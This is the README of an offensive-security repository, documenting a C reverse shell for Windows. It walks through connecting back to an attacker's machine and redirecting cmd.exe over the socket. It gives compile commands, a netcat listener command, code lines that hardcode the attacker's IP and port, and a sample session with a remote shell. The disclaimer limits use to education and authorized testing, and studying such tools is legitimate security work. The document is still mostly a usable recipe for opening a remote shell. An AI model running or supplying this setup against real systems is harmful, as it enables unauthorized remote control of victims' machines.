# Reverse Shell Program in C

This directory contains a C program (`reverse_shell.c`) that implements a reverse shell, part of the **BlackHatOps** repository. The program is designed for **educational and research purposes** in offensive security, demonstrating how a reverse shell can connect back to an attacker’s machine on a **Windows** system. This README provides an overview of the code, explains the processes involved, and includes compilation, setup, and usage instructions.

## Overview

The Reverse Shell program (`reverse_shell.c`) establishes a TCP connection from a target Windows machine to an attacker’s machine, redirecting a command shell (e.g., `cmd.exe`) to the attacker. The attacker uses a tool like **Netcat** to listen for the connection. The program is intended for use in controlled environments on systems you own or have explicit permission to test.

## Files

- `reverse_shell.c`: Implements the reverse shell client that connects to the attacker’s machine and spawns a command shell.

## Process Explanation

### reverse_shell.c (Windows)

1. **Winsock Initialization**:
   - The program initializes the Winsock library using `WSAStartup()` to enable socket functionality.

2. **Socket Creation**:
   - A TCP socket is created using `socket()` with the `AF_INET` address family (IPv4) and `SOCK_STREAM` type (TCP).

3. **Connection to Attacker**:
   - The program specifies the attacker’s IP address and port (e.g., `127.0.0.1:4444`) in a `sockaddr_in` structure.
   - The `connect()` function establishes a connection to the attacker’s listening machine.

4. **Redirect Command Shell**:
   - The program sets up a `STARTUPINFO` structure to redirect the standard input, output, and error streams of `cmd.exe` to the socket.
   - `CreateProcess()` launches `cmd.exe`, with its input/output redirected to the socket, allowing the attacker to interact with the command shell remotely.

5. **Cleanup**:
   - The program closes the socket using `closesocket()` and cleans up Winsock with `WSACleanup()`.

### Key Concepts

- **Reverse Shell**: Unlike a bind shell, a reverse shell initiates a connection from the target to the attacker, useful for bypassing firewalls.
- **Winsock**: Windows-specific socket API for network communication.
- **Process Creation**: Uses `CreateProcess()` to spawn `cmd.exe` with redirected I/O.
- **Netcat**: The attacker uses Netcat (`nc`) to listen for the incoming connection and interact with the shell.

## Installation

1. Clone the repository on the Windows target machine:
   ```bash
   git clone https://github.com/CyberForgeEx/BlackHatOps.git
   ```
2. Navigate to the Reverse Shell directory:
   ```bash
   cd BlackHatOps/Basic\ Concepts/Reverse\ Shell
   ```

## Compilation

### Target Machine (Windows)
1. Open CMD (e.g., MSYS2 MinGW 64-bit, Git Bash, or PowerShell with MinGW in PATH).
2. Compile the program:
   ```bash
   gcc -o reverse_shell reverse_shell.c -lws2_32
   ```

## Usage

1. **Set Up the Attacker Machine**:
   - On the attacker machine (Linux or Windows), start a Netcat listener on a chosen port (e.g., `4444`):
     ```bash
     nc -lvp 4444
     ```
     - `-l`: Listen mode.
     - `-v`: Verbose output.
     - `-p 4444`: Specifies the port to listen on.
   - Note the attacker’s IP address (e.g., `192.168.1.100`).

2. **Configure the Reverse Shell**:
   - Edit `reverse_shell.c` to set the attacker’s IP address and port. Modify the lines (_Hardcode the IP and Port_):
     ```c
     server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Attacker's IP
     server.sin_port = htons(4444); // Attacker's port
     ```
   - Replace `192.168.1.100` and `4444` with the attacker’s actual IP and port.
   - Recompile after editing:
     ```bash
     gcc -o reverse_shell reverse_shell.c -lws2_32
     ```

3. **Run the Reverse Shell (Windows)**:
   - On the target machine, execute the compiled binary:
     ```bash
     ./reverse_shell.exe
     ```
   - The program connects to the attacker’s machine and spawns a `cmd.exe` shell.

4. **Interact with the Shell**:
   - On the attacker machine, the Netcat listener receives the connection and provides a command prompt.
   - Type commands (e.g., `dir`, `whoami`) to interact with the target’s command shell.

5. **Output**:
   - The attacker’s Netcat terminal displays the command shell output.
   - Example interaction on attacker terminal:
     ```
      C:\Windows\System32>whoami
      b****************i\****k
     ```


## Testing Requirements

- **Same Network**: The target (Windows) and attacker (Linux/Windows) machines must be on the same network (e.g., local LAN or VPN).
- **Netcat Listener**: The attacker must run Netcat to listen on the specified port before executing the reverse shell.
- **Firewall**: Ensure the attacker’s port (e.g., `4444`) is open and not blocked by a firewall.
- **Administrative Privileges**: The reverse shell may require administrative privileges on the target machine to execute `cmd.exe`.

## Troubleshooting

- **“gcc is not recognized” (Windows)**: Ensure MinGW/MSYS2 is installed and added to PATH.
- **“Connection failed”**: Verify the attacker’s IP and port are correct, the Netcat listener is running, and no firewall blocks the connection.
- **“CreateProcess failed”**: Ensure the program is run with sufficient permissions (e.g., as Administrator).
- **No shell prompt**: Confirm the target and attacker are on the same network and the port matches.

## Disclaimer

This program is for **educational and research purposes only**. Use it only on systems you own or have explicit permission to test. Unauthorized use, including establishing connections to systems without consent, is **illegal and unethical**. The developers are not responsible for misuse or damages. Always comply with local laws and regulations.
